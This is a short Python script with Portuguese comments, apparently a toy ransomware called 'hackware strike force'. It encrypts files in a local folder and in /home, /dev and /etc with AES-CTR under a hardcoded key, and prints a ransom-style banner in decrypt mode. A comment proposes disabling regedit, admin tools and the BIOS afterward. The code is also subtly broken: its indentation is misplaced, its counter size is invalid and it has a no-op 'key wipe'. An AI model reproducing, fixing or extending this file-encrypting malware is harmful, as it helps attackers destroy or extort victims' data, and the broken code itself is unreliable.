#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

# -----------------
# A senha pode ter os seguintes tamanhos:
# 128/192/256 bits - 8bite = 1byte = 1 caracter unicode
# 256/8 = 32 bytes
# -----------------

HARDCODED_KEY = 'hackware strike force strikes u! '


def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument(
        '-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']
    if decrypt:
        print('''
        HACKWARE STRIKE FORCE
        ------------------------------------------------------------
        SEUS ARQUIVOS FORAM CRIPTOGRAFADOS
        PARA DECRIPTÁ-LOS, UTILIZE A SEGUINTE SENHA '{}'
        ------------------------------------------------------------
        
        '''.format(HARDCODED_KEY))
        key = input('Digite a senha: ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(256)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptoFn = crypt.encrypt
    else:
        cryptoFn = crypt.decrypt

        init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
        startDirs = [init_path, '/home', '/dev', '/etc']

        for currentDir in startDirs:
            for filename in Discovery.discover(currentDir):
                Crypter.change_files(filename, cryptoFn)
        # limpa a chave de criptografia da memoria
        for _ in range(100):
            pass

        if not decrypt:
            pass
            # apos a encriptação, voce pode alterar o wallpaper
            # alterar icons, desativar regedit, admin, bios, etc

        if __name__ == '__main__':
            main()
